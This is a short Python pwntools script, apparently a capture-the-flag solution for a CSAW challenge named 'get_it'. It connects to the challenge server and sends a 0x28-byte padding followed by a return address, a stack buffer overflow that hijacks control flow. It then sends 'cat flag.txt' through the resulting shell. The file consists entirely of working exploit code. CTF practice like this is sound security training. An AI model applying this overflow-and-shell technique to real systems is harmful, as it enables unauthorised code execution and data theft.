#!/usr/bin/env python
from pwn import *
#p = process("./get_it")

context.log_level = "DEBUG"
p = remote("pwn.chal.csaw.io", 1437)
#p = remote("localhost", 1437)

p.recvuntil("??")
p.sendline(b"A" * 0x28 + p64(0x4005b6))

p.recvline()
p.sendline(b"cat flag.txt\n")
p.recvuntil("}")
p.close()
exit(0)
